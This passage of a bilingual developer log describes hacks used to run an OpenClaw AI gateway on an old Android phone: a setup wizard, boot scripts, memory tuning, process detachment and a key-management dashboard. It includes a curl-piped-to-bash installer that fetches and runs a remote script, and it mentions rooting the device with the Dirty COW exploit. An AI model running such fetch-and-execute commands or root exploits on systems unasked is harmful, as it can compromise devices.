- **Step 2:** Choose AI provider — Kimi (free), Groq (free tier), or OpenAI (paid)
- **Step 3:** Enter bot token + API key
- **Step 4:** Click DEPLOY → writes `openclaw.json` + `env`, restarts gateway

Same green CRT theme as dashboard. Works from the phone browser OR from any device on the same WiFi. Zero SSH, zero terminal.

The setup writes the complete OpenClaw config including provider definition, channel config, identity/personality, and environment variables (chmod 600). Then triggers `process.exit(0)` — the watchdog loop in `start-openclaw` auto-restarts with the new config.

**Status: OK — /setup returns 200, /dashboard + /api/status still work**

---

### Hack #39 — One-Liner Installer (install.sh)

**Problem:** Installing PocketClaw requires ~20 manual steps: Termux packages, proot, Node.js, OpenClaw, config files, scripts, crons, boot setup. Nobody will do all that.

**Solution:** `install.sh` — run from Termux, does everything:
```bash
curl -sL https://raw.githubusercontent.com/MonteiroRobin/pocketclaw/main/install.sh | bash
```

The script:
1. Pre-flight checks (Termux, WiFi, RAM ≥512 MB, disk ≥800 MB)
2. Installs packages (proot-distro, openssh, busybox)
3. Sets up proot Ubuntu
4. Downloads & installs Node.js 22 (auto-detects ARM/ARM64/x64)
5. Installs OpenClaw via npm
6. Deploys hijack.js from GitHub
7. Generates all scripts (start-openclaw, restart-gw, healthcheck, logrotate, pocketclaw CLI)
8. Auto-sizes V8 heap based on phone RAM (128/256/384 MB)
9. Configures boot auto-start + crons
10. Strips ~200 MB of proot bloat
11. Starts gateway and prints setup URL

At the end: "Open http://localhost:9000/setup" — the setup wizard handles the rest.

**Status: WRITTEN — needs testing on a fresh phone**

---

### Hack #40 — Tier 1.5: Headless Server Mode (pm disable system apps)

**Problem:** Android consumes ~244 MB even after disabling 54+ Google/Motorola packages. SystemUI (70 MB RSS), Phone (42 MB), Media provider (40 MB), Keychain (35 MB) are all running for a phone that serves as a headless AI server. Nobody's making phone calls on this thing.

**Solution:** `pm disable` the remaining system apps via Dirty COW root:
```bash
pm disable com.android.systemui      # -70 MB (status bar, nav buttons)
pm disable com.android.phone          # -42 MB (dialer, no SIM anyway)
pm disable com.android.providers.telephony  # telephony data
pm disable com.android.providers.media      # -40 MB (media scanner)
pm disable com.android.keychain       # -35 MB (cert management UI)
```

**Results after reboot:**
| Metric | Before (Tier 1) | After (Tier 1.5) | Saved |
|---|---|---|---|
| Android base (sans gateway) | 244 MB | 196 MB | **48 MB** |
| Total RAM used | 441 MB | 374 MB | **67 MB** |
| RAM libre | 457 MB (51%) | 524 MB (58%) | **+67 MB** |
| Gateway boot time | ~120s | ~70s | **42% faster** |

**Key findings:**
- `com.android.systemui` starts anyway in degraded mode (~5 MB instead of 70 MB) — system_server force-starts it
- `com.android.phone` also respawns (~13 MB) — system_server is persistent
- `am force-stop` on system services is useless — they respawn immediately from zygote
- WiFi works fine without these (DHCP is in system_server, not GMS)
- No bootloop — just slower boot (~5 min vs 2 min, system_server retries dead services)
- V8 heap 128 MB remains stable — the earlier OOM was kernel pressure during chaotic boot, not heap limit

**Added to `boot-debloat.sh`** with recovery comment:
```bash
# --- Tier 1.5: Aggressive debloat (headless server mode) ---
# Recoverable via: adb shell pm enable com.android.systemui
```

**Status: OK — 374 MB RAM, 128 MB heap, gateway stable, Android base under 200 MB**

---

---

### Hack #41 — APK v2 : Launcher avec escape hatches (post-brick fix)

**Problème :** APK v1 (Hack #32) était un piège parfait. `FLAG_FULLSCREEN` cachait la status bar, `onBackPressed(){}` désactivait Back, et `category.HOME` bouclait le bouton Home. Quand la batterie est morte et que l'autorisation ADB a été perdue, la popup d'auth est apparue DERRIÈRE le launcher fullscreen. Impossible de l'accepter. Impossible d'accéder aux notifications. Impossible d'atteindre les Paramètres. **Factory reset obligatoire.**

**La séquence de brick :**
1. Batterie meurt → téléphone s'éteint
2. Clés RSA ADB invalidées (déconnexion USB)
3. Téléphone reboote → PocketClaw Launcher démarre fullscreen
4. Branche USB → popup ADB auth apparaît DERRIÈRE le launcher
5. Impossible de swipe la notification shade (cachée par FLAG_FULLSCREEN)
6. Impossible d'appuyer Back (onBackPressed est vide)
7. Impossible d'atteindre les Paramètres (aucun escape)
8. Termux:Boot n'a pas relancé le gateway (voir Hack #42)
9. Dashboard affiche "Waiting for boot..." pour toujours
10. **Factory reset nécessaire** — tout perdu

**Solution (5 protections) :**

1. **Status bar visible :** `Theme.NoTitleBar` au lieu de `Theme.NoTitleBar.Fullscreen`. Status bar color `0xFF000A00` (matche le fond). Les dialogs système apparaissent par-dessus, notification shade accessible.

2. **Triple-tap escape :** Tap "POCKETCLAW" 3x en 1 seconde → ouvre les Paramètres Android. Pas de hint visuel (anti-accident), mais fiable pour qui sait.

3. **Double-back launcher chooser :** 1er Back → toast "Back again to switch launcher". 2ème Back en 2s → `Intent.createChooser` avec `CATEGORY_HOME`.

4. **Bouton rouge d'urgence :** Si le gateway ne répond pas pendant 5+ minutes, un gros bouton rouge "OPEN SETTINGS" apparaît à l'écran. Visible, pas caché. Disparaît quand le gateway revient.

5. **Kill switch ADB :** `adb shell am broadcast -a com.pocketclaw.EXIT` → ouvre Settings même si l'UI est bloquée. BroadcastReceiver enregistré dans onCreate, nettoyé dans onDestroy.

**Ce qu'on garde :** `category.HOME` (c'est la feature), `singleTask`, `FLAG_KEEP_SCREEN_ON`, thème CRT dark, animation crabe.

**Taille APK :** Toujours < 20 KB. Zéro dépendance.

**Règles "never again" :**
- Jamais disable `providers.media`
- Jamais Dirty COW sur `app_process32`
- Toujours un escape hatch dans le launcher
- Toujours un second launcher installé en backup
- Boot script avec retry loops, pas de sleeps fixes

---

### Hack #42 — Boot Script avec retry WiFi

**Problème :** Le boot script (`boot-openclaw.sh`) faisait un `sleep 15` aveugle puis lançait tout. Pas de retry, pas de logging. Si le WiFi prenait 30 secondes au lieu de 15, tout cascadait en échec silencieux.

**Solution :**
1. **Retry loop WiFi :** Ping toutes les 5 secondes, jusqu'à 12 tentatives (60s max). Log chaque essai.
2. **Boot logging :** Chaque étape loguée dans `$PREFIX/tmp/pocketclaw-boot.log` avec timestamp ISO.
3. **Dégradation gracieuse :** Si WiFi pas prêt, continue (le watchdog du gateway réessaie). Si sshd/crond échouent, le reste démarre quand même.
4. **Crons hardened :** Écriture directe au fichier crontab au lieu de pipe `crontab -` (plus fiable sur devices contraints).

**Résultat :** Boot fiable même si WiFi met 45 secondes, et debug possible via `cat $PREFIX/tmp/pocketclaw-boot.log`.

---

### Hack #43 — Git wrapper sed rewrite (replaces bash substitution)

**Problem:** npm passes SSH URLs in multiple formats: `git+ssh://git@github.com/...`, `ssh://git@github.com/...`, `git@github.com:...`. Bash `${var/pattern/replace}` only catches one format, leaving the other two to fail with authentication errors.

**Solution:** Use `sed` in the git wrapper to rewrite all 3 SSH URL patterns to HTTPS in a single pass:

```bash
ARGS=$(echo "$@" | sed 's|git+ssh://git@github.com|https://github.com|g; s|ssh://git@github.com|https://github.com|g; s|git@github.com:|https://github.com/|g')
```

File: `$ROOTFS/usr/local/bin/git`

**Status: OK — All 3 SSH URL formats rewritten to HTTPS, npm git dependencies resolve correctly**

---

### Hack #44 — npm cache on ext4 (not SD card)

**Problem:** FAT32/sdcardfs on `/sdcard/` can't handle deep nested paths that git creates during `npm install` for git dependencies. Error: `unable to write file .git/objects/1c/30d7d7e76a3b0aa120b04dc6a26f5a12dccf67: No such file or directory`. The SD card filesystem silently truncates or rejects paths that exceed its limits.

**Solution:** Move npm cache inside the rootfs (ext4 filesystem) instead of the SD card:

```bash
npm config set cache /root/.npm-cache
```

**Why this works:** The rootfs lives on `/data/` which is ext4 — no path length or nesting limits. The SD card (Hack #8) was fine for regular npm packages but breaks on git dependencies that create deep `.git/objects/` hierarchies.

**Trade-off:** Uses internal storage instead of SD card. npm cache is ~50-100 MB, but with 715 MB free after rootfs diet (Hack #37), this is acceptable.

**Status: OK — git dependencies install cleanly, no more path errors**

---

### Hack #45 — ESM stubs at HOST path (bind mount shadow fix)

**Problem:** With `--bind=$PREFIX:$PREFIX`, proot resolves `/data/data/com.termux/files/usr/` to the HOST filesystem, NOT the rootfs. So stubs created at `$ROOTFS/data/data/.../openclaw/node_modules/` are invisible — they're shadowed by the real packages at `$PREFIX/lib/node_modules/openclaw/node_modules/`. Node.js sees the originals, not the stubs. All the RAM savings from Hack #19 disappear.

**Root cause:** proot bind mounts work by intercepting syscalls. When a path matches a bind mount source, proot redirects it to the host path. Since `$PREFIX` is bind-mounted to itself, any file under `$PREFIX` on the rootfs is invisible — the host version wins.

**Solution:** Create stubs at the HOST path directly, not inside the rootfs:

```bash
OCDIR=$PREFIX/lib/node_modules/openclaw/node_modules
```

NOT `$ROOTFS/data/data/com.termux/files/usr/lib/node_modules/openclaw/node_modules`

This writes the stub packages directly where Node.js will find them, bypassing the bind mount shadow entirely.

Files: `scripts/create-stubs.sh`, `tools/fix-stubs.sh`

**Status: OK — Stubs visible to Node.js, RAM savings restored**

---

### Hack #46 — V8 heap 192MB minimum

**Problem:** 128MB heap (Hack #27) OOMs during OpenClaw startup even with ESM stubs. The startup compilation phase — where V8 parses, compiles, and links all ESM modules — needs ~186MB of heap. This is a transient peak: once boot completes, steady-state usage drops to ~90-110MB. But V8 must survive the peak to reach steady state.

**Solution:** Set 192MB as the minimum viable heap:

```bash
--max-old-space-size=192
```

**Why 192 and not 128:** On 898MB RAM (Moto E2), the boot peak at 186MB plus V8 GC overhead exceeds 128MB. The GC via hijack.js (Hack #4) frees ~15MB periodically to keep it stable after boot, but can't help during the initial compilation burst.

**Why not higher:** Every MB of V8 heap is a MB Android can't use. 192MB leaves ~524MB for Android (Tier 1.5 debloat) — enough margin for WiFi management and background services.

```bash
# In start-openclaw.sh
export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=192'
```

**Status: OK — Gateway boots reliably at 192MB heap, stable at ~178MB RSS**

---

### Hack #47 — Native node22-icu (proot eliminated)

**Problem:** proot adds ~30 MB overhead and causes subtle syscall translation bugs. The gateway was spending more time in proot's ptrace loop than doing actual work.

**Solution:** Cross-compiled Node.js 22.12.0 with ICU using Android NDK for ARM32. Created `libapi23compat.so` LD_PRELOAD shim providing 11 API 24 symbols missing from Android 6.0's bionic (`in6addr_any`, `__emutls`, `getgrnam_r`, `pthread_barrier`, etc.). Gateway runs natively — no proot, no container, no chroot.

```bash
# In start-openclaw.sh
export LD_PRELOAD="$PREFIX/lib/libapi23compat.so"
node22-icu "$OPENCLAW_DIR/openclaw.mjs" gateway run --port 9000
```

**Impact:** -29 MB RSS, faster startup, eliminated entire class of proot-related bugs.

**Status: OK — Native execution stable, 155 MB RSS**

---

### Hack #48 — Lazy loading v3 (Proxy-based deferred require)

**Problem:** OpenClaw loads 1547 npm modules at startup. Most are never used (Discord SDK when using Telegram, Anthropic SDK when using Kimi, etc.). Previous stub approach (Hack #19) broke modules permanently — they couldn't be used even when needed.

**Solution:** Proxy-based lazy loading in hijack.js. Instead of dead stubs, each deferred module gets a `Proxy` wrapper. On first property access, the real module loads transparently. This makes PocketClaw *more* capable than base OpenClaw — everything works, only what you use consumes RAM.

```javascript
// 37 package prefixes deferred (AI SDKs, channel SDKs, heavy features)
const _LAZY_PKGS = ["@anthropic-ai", "discord.js", "openai", "sharp", ...];
// On require("discord.js") → returns Proxy
// On proxy.Client → loads real module, returns Client
```

**Impact:** ~40 MB deferred at startup, loads on demand. Logged via `[lazy] discord.js +12MB (340ms)`.

**Status: OK — 37 lazy proxies, zero breakage, all features available on first use**

---

### Hack #49 — setsid gateway detach (survives Dalvik kill)

**Problem:** The gateway process was a child of Termux's bash, which runs under Termux's Dalvik VM. Killing the Dalvik VM (to free 20-40 MB) also killed the gateway. The gateway needed to survive independently.

**Solution:** Launch the gateway with `/system/bin/setsid` to create a new session. The process becomes a session leader with no controlling terminal, completely detached from Termux's process tree. When the Termux Dalvik is killed, the gateway keeps running.

```bash
# In start-pocketclaw.sh
/system/bin/setsid start-openclaw > "$PREFIX/tmp/openclaw-gateway.log" 2>&1 &
```

**Why setsid and not nohup:** `nohup` only handles SIGHUP. `setsid` creates an entirely new session — the process isn't a child of anything killable. It survives `am force-stop`, `kill -9` on the parent, and Dalvik VM termination.

**Status: OK — Gateway survives Dalvik kill, confirmed across reboots**

---

### Hack #50 — kill-dalvik cron (auto-free ~40 MB after boot)

**Problem:** After boot, Termux's Dalvik VMs (`com.termux` ~49 MB + `com.termux.boot` ~40 MB) consume ~89 MB of RAM. Once the gateway is detached via setsid (Hack #49), these VMs serve no purpose.

**Solution:** A cron job (`kill-dalvik.sh`) that kills `com.termux.boot` Dalvik VM every 2 minutes. Uses `/system/bin/ps` (Termux's procps only shows current-TTY processes, missing Dalvik VMs entirely). Uses shell builtins to parse PIDs (no `awk` in `/system/bin`).

**Critical discovery — Android cgroup cascade kill:** Killing `com.termux` Dalvik triggers Android's ActivityManagerService to kill ALL processes in its cgroup — including the gateway, crond, and all bash processes. The gateway cannot survive this. Only `com.termux.boot` can be safely killed (separate package = separate cgroup). To also kill `com.termux`, must restart gateway from outside (ADB shell) after the kill.

```bash
PS=/system/bin/ps
# Only kill if gateway is running
if ! $PS 2>/dev/null | grep -q "openclaw-gateway"; then exit 0; fi
# Kill com.termux.boot only (safe — separate package)
$PS 2>/dev/null | grep "com.termux.boot$" | grep -v grep | while read _USER PID _REST; do
  kill -9 $PID 2>/dev/null
done
```

**Lessons learned:**
1. Termux's `ps` (procps) without flags only shows processes with current TTY — Dalvik VMs and setsid-detached processes are invisible
2. `/system/bin/ps` shows ALL processes with format: `USER PID PPID VSIZE RSS WCHAN PC NAME`
3. `awk` doesn't exist in `/system/bin` — use shell builtins (`read`) instead
4. OpenClaw sets `process.title = "openclaw-gateway"` — grep for this, not `node22`
5. Windows CRLF line endings break scripts on Android — must `tr -d '\r'` before deploying

**Impact:** -40 MB RAM (com.termux.boot). Additional -49 MB possible via manual ADB kill + restart.

**Status: OK — Confirmed 352 MB total after both Dalviks killed (was 368 with Dalviks)**

---

### Hack #51 — fs.promises patching (EACCES on /root paths)

**Problem:** OpenClaw uses `fs.promises.mkdir("/root/.openclaw/...")` internally. In native mode (no proot), `/root` doesn't exist on Android — it's a kernel mount point with no write permissions. The Telegram channel would crash with `EACCES: permission denied, mkdir '/root/.openclaw/tmp/openclaw'`.

**Solution:** Extended the path-rewriting shim in hijack.js to also patch `fs.promises`. The original shim (Hack #4) only patched synchronous `fs` methods. OpenClaw's async code paths use `fs.promises.mkdir`, `fs.promises.writeFile`, etc., which bypassed the shim entirely.

```javascript
// Patch fs.promises (OpenClaw uses async fs operations)
if (_fs0.promises) {
  ["mkdir","writeFile","readFile","open","stat","lstat","unlink",
   "readdir","rmdir","appendFile","rename","chmod","access",
   "copyFile","rm"].forEach(function(fn) {
    if (typeof _fs0.promises[fn] === "function") {
      var orig = _fs0.promises[fn];
      _fs0.promises[fn] = function() {
        if (arguments.length > 0) arguments[0] = _fixPath(arguments[0]);
        return orig.apply(this, arguments);
      };
    }
  });
}
```

**Status: OK — Telegram channel works, all async fs operations redirected**

---

### Hack #52 — 3-page dashboard (STATUS / KEYS / LOGS)

**Problem:** The original dashboard (Hack #29) was a single page showing system status. As PocketClaw grew, there was no way to view real-time logs or manage API keys without SSH access.

**Solution:** Extended the hijack.js HTTP interceptor to serve three pages with tab navigation:

1. **STATUS** (`/dashboard`) — Live system status: services, RAM bar, swap, top processes, uptime, lazy loading stats, animated CRT crab
2. **KEYS** (`/keys`) — API key management: view masked keys, edit values, test connectivity (hits provider API endpoints)
3. **LOGS** (`/logs`) — Real-time gateway logs with auto-scroll, color-coded errors/warnings, lazy module load history

All pages share the CRT green-on-black aesthetic with scanline effects, share a tab bar, and auto-refresh every 2-3 seconds.

```
Routes injected into OpenClaw's HTTP server:
/dashboard  → STATUS page (HTML)
/keys       → KEYS page (HTML)
/logs       → LOGS page (HTML)
/api/status → JSON status data
/api/heap   → V8 heap diagnostics
/api/keys   → Key list (GET) / Key save (POST)
/api/keys/test → Test key validity
/api/logs   → Log buffer + lazy log
```

**Status: OK — All 3 pages functional, accessible at phone IP:9000**

---

### Hack #53 — API key management (test/edit/add via dashboard)

**Problem:** Changing API keys required SSH access to edit the env file manually. Testing if a key was valid meant crafting curl commands. Not practical for a device meant to run autonomously.

**Solution:** Full key management API and UI in the KEYS dashboard page:

- **View:** Shows all configured keys (KIMI, MOONSHOT, TELEGRAM, DISCORD, OPENAI, GROQ) with masked values
- **Edit:** Inline edit field, saves to env file and updates `process.env` live (no restart needed)
- **Test:** One-tap validation — hits each provider's API endpoint (`/v1/models` for AI providers, `/getMe` for Telegram, `/@me` for Discord) and shows result
- **Add:** Add arbitrary new keys via name/value form

Keys are stored in `~/.openclaw/env` with mode 0600. The test endpoint uses HTTPS with 5-second timeout.

**Status: OK — Keys editable and testable from any browser on the local network**

---

### Hack #54 — Dead packages (_DEAD_PKGS instant stubs)

**Problem:** Lazy loading (Hack #48) defers module loading until first use — but the module is still fully loaded when accessed. For providers/channels that will NEVER be used on this device (Anthropic, Google, AWS, Discord, Slack, WhatsApp, etc.), even deferred loading is wasteful.

**Solution:** Split the lazy list into two categories:
- `_DEAD_PKGS` — returns `_deadStub` immediately, never loads the real module (0 MB)
- `_LAZY_PKGS` — defers loading until first property access (loads on demand)

```javascript
const _DEAD_PKGS = [
  "@anthropic-ai",     // Claude — not used
  "@google",           // Google GenAI — not used
  "@aws-sdk", "@aws-crypto", "@aws", "@smithy",  // AWS Bedrock
  "cohere-ai", "@mistralai", "@huggingface", "@cloudflare",
  "discord.js", "@discordjs", "@buape/carbon",  // Discord
  "@slack", "@line", "@whiskeysockets", "libsignal", "@larksuiteoapi",
];
```

The `_matchPkgList()` helper unifies prefix matching for both lists. Dead count is tracked and shown on the dashboard (`dead: 23`).

**Impact:** 23 packages instantly stubbed. ~9 MB RAM saved vs lazy loading them.

**Status: OK — 23 dead, 6 deferred, 8 loaded on demand**

---

### Hack #55 — termux-wake-lock + Doze bypass (sleep mode)

**Problem:** When the phone screen turns off, Android 6's Doze mode suspends the CPU after ~30 min of inactivity. The gateway stops processing — Telegram messages queue up for hours, only handled during brief maintenance windows every 2-3 hours.

**Discovery:** GC logs prove it — overnight gaps of 2-3 hours between GC cycles:
```
22:22 GC freed 16 MB
00:00 GC freed 18 MB   ← 1h38 gap (Doze)
02:57 GC freed 15 MB   ← 3h gap
05:23 GC freed 18 MB   ← 2.5h gap
```

**Solution (dual-layer):**
1. `termux-wake-lock` in boot script — acquires Android `PARTIAL_WAKE_LOCK` (CPU on, screen off)
2. `adb shell dumpsys deviceidle whitelist +com.termux` — exempts Termux from Doze (persists across reboot)
3. `adb shell dumpsys deviceidle disable` — disables Doze entirely (must re-run after reboot, only works from ADB shell UID 2000)

**Constraint:** `termux-wake-lock` starts Termux's foreground service via `am startservice`. This requires `com.termux` Dalvik VM alive (48 MB). Killing it releases the wake lock AND cascade-kills the gateway via cgroup. The 48 MB is the unavoidable cost of sleep-mode support.

**Why not kernel wake lock?** Writing to `/sys/power/wake_lock` requires root. Could be done via Dirty COW but adds complexity.

**Why not just `deviceidle disable`?** Only works from ADB shell (UID 2000), fails from Termux (UID 10096, needs `android.permission.DUMP`). Does not persist across reboot.

```bash
# In start-pocketclaw.sh (runs at boot via Termux:Boot)
termux-wake-lock 2>/dev/null && log "Wake lock acquired"
```

**Impact:** Gateway responds to Telegram messages in real-time 24/7, even with screen off.

**Status: OK — Confirmed: GC fires every 30s in sleep mode (was every 2-3h without wake lock)**

---

### Hack #56 — Merged kill loop (3 bash → 1 bash)

**Problem:** The boot script spawned 3 separate `while true` loops for background kills: SystemUI killer (every 60s), dormant service killer (every 5 min), and the old monitor script. Each bash process = ~1.5 MB RSS.

**Solution:** Merged all background kills into a single loop running every 5 minutes. Monitor script removed entirely (dashboard shows live stats). SystemUI killer interval relaxed from 60s to 300s (it respawns slowly anyway).

```bash
# Single merged kill loop (was 3 separate loops)
(while true; do
  sleep 300
  for PKG in com.android.systemui com.android.settings com.android.keychain \
    com.android.externalstorage com.android.defcontainer \
    com.android.location.fused com.motorola.ccc.devicemanagement; do
    am force-stop "$PKG" 2>/dev/null
  done
done) &
```

Also expanded the force-stop list from 9 to 12 packages (added `com.android.location.fused`, `com.motorola.ccc.devicemanagement`, `com.android.defcontainer`).

**Impact:** -3 MB RAM (2 fewer bash processes), fewer fork/exec cycles.

**Status: OK**

---

### Hack #57 — V8 semi-space 2→1 MB (safe heap reduction)

**Problem:** V8's young generation (semi-space) defaults to 2 MB. For an I/O-bound gateway that barely allocates short-lived objects, this is wasted memory. Reducing the old-space heap is dangerous (128 MB OOMs instantly, 140 MB OOMs after ~1 hour), but semi-space can be halved safely.

**What was tested:**
| Setting | Result |
|---------|--------|
| `--max-old-space-size=128` | Instant OOM at startup (old space needs ~133 MB for module loading) |
| `--max-old-space-size=140` | Boots fine, V8 abort (SIGABRT/exit 134) after ~1 hour |
| `--initial-old-space-size=32` | Crashes node22-icu immediately (exit 9 — unsupported flag) |
| `--max-old-space-size=150 --max-semi-space-size=1` | **Stable** — 11h+ uptime, no OOM |

**Solution:** Keep `--max-old-space-size=150` (minimum viable), reduce `--max-semi-space-size=2` → `1`:

```bash
export NODE_OPTIONS="-r $HIJACK --expose-gc --no-warnings --max-old-space-size=150 --max-semi-space-size=1"
```

**Impact:** Gateway RSS dropped from 216 MB to 180 MB (-36 MB). Total system RAM: 346 MB (was 380 MB). The 150 MB old-space floor is the absolute minimum — V8 uses ~133 MB steady state, leaving only 17 MB headroom for spikes during message processing and lazy module loading.

**Status: OK — Stable at 346 MB total, 180 MB gateway RSS**

---

*"On m'a dit que c'était impossible, alors je l'ai fait." — Probablement pas Einstein, mais on s'en fout.*

*Total : ~22 heures. 57 hacks. 0 EUR de hardware. Un Moto E2 de 2015 transforme en PocketClaw OS : agent IA autonome, dashboard CRT 3 pages, setup wizard web, boot autonome, wake lock, headless server mode. Un brick. Un factory reset. Des lecons. De PoC a produit installable.*
